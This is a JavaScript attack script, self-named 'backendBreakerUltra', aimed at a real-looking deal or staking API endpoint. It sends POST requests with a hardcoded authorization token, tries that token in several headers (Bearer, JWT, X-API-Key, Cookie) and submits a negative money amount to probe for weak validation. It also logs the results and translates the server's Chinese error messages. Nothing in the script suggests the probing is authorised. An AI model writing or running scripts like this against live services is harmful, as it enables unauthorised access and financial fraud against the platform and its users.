const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
import fs from "fs";

const endpoint = 'https://fnn02.vip/api_deal/load/create';
const authHeaderRaw = 'TERc/9260xgILO4HuXsdtru5hUy4NZjhpkzd/DhE6dFVY5F/OeFmjKcyxdgfTmEri7QVcxVVCuCp9Gg95K1nIlSKv4Rl3pyHzkJR0ji1yw2Nqzp0srkvQoGkRHPBb8ydi99aFnkR00PeDAqHjmTAHY2mdp9pgnfKrAo3Aa7BwIU='
const resultsFile = 'ultra_results.json';

// ====== Chinese Error Translator ======
const translate = (msg) => {
  const dict = {
    '账户余额不足': 'Insufficient account balance',
    '质押金额过低': 'Pledged amount too low',
    '质押金额超限': 'Pledged amount exceeds limit',
    '请输入有效金额': 'Please enter a valid amount',
    '请选择一个有效的交易': 'Please select a valid deal'
  };
  return dict[msg] || `Unknown error: ${msg}`;
};

// ====== Logging ======
const log = (strategy, payload, response, translated) => {
  const record = { strategy, payload, response, translated, timestamp: new Date().toISOString() };
  fs.appendFileSync(resultsFile, JSON.stringify(record, null, 2) + ',\n');
};

// ====== HTTP Request Sender ======
const sendRequest = async ({ strategy, url = endpoint, headers = {}, body, raw = false }) => {
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...headers
      },
      body: raw ? body : JSON.stringify(body)
    });
    const contentType = res.headers.get('content-type') || '';
    const text = await res.text();
    let parsed = text;
    let translated = null;
    if (contentType.includes('application/json')) {
      const json = JSON.parse(text);
      parsed = json;
      if (json.error && /[\u4e00-\u9fa5]/.test(json.error)) translated = translate(json.error);
    }
    console.log(`🔹 ${strategy} →`, parsed, translated ? `(Translated: ${translated})` : '');
    log(strategy, raw ? body : body, parsed, translated);
  } catch (err) {
    console.error(`⚠️ ${strategy} error:`, err.message);
    log(strategy, body, { error: err.message }, null);
  }
};

(async () => {
  console.log('🔥 Running backendBreakerUltra.js with header variations\n');

  // 1. Clean input
  await sendRequest({ strategy: 'clean', headers: { 'Authorization': authHeaderRaw }, body: { deal_id: 7, money: 100 } });

  // 2. Header variation tests
  const headerVariants = [
    { 'Authorization': authHeaderRaw },
    { 'Authorization': 'Bearer ' + authHeaderRaw },
    { 'Authorization': 'JWT ' + authHeaderRaw },
    { 'X-Auth-Token': authHeaderRaw },
    { 'X-API-Key': authHeaderRaw },
    { 'Token': authHeaderRaw },
    { 'Cookie': `token=${authHeaderRaw}` }
  ];
  for (const h of headerVariants) {
    await sendRequest({ strategy: `header-var-${Object.keys(h)[0]}`, headers: h, body: { deal_id: 7, money: -100 } });
  }

  // 3. Other strategies unchanged...

  console.log('\n💣 backendBreakerUltra complete. Results in ultra_results.json');
})();
